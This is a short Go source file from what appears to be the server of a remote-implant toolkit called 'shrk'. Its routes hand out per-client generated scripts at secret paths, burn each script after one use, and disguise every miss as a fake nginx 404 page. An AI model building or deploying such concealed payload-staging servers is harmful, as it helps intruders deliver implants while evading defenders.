package routes

import (
	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/shrk/server/config"
	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/log"
	"github.com/ngn13/shrk/server/util"
)

func GET_source(c *fiber.Ctx) error {
	conf := c.Locals("config").(*config.Type)
	return c.SendFile(conf.Source)
}

func GET_script(c *fiber.Ctx) error {
	var (
		client *database.Client
		conf   *config.Type
		db     *database.Type
		script string
		err    error
	)

	conf = c.Locals("config").(*config.Type)
	db = c.Locals("database").(*database.Type)

	if script = c.Params("script"); script == "" {
		return util.RenderNginxNotFound(c)
	}

	for i := range db.Clients {
		client = &db.Clients[i]

		if client.ScriptPath() != script || client.IsBurned {
			continue
		}

		if script, err = client.BuildScript(conf); err != nil {
			log.Fail("failed to build the script for %s: %s", client.ID, err.Error())
			return util.RenderNginxNotFound(c)
		}

		if client.ShouldBurn {
			client.IsBurned = true
		}

		return c.SendString(script)
	}

	return util.RenderNginxNotFound(c)
}
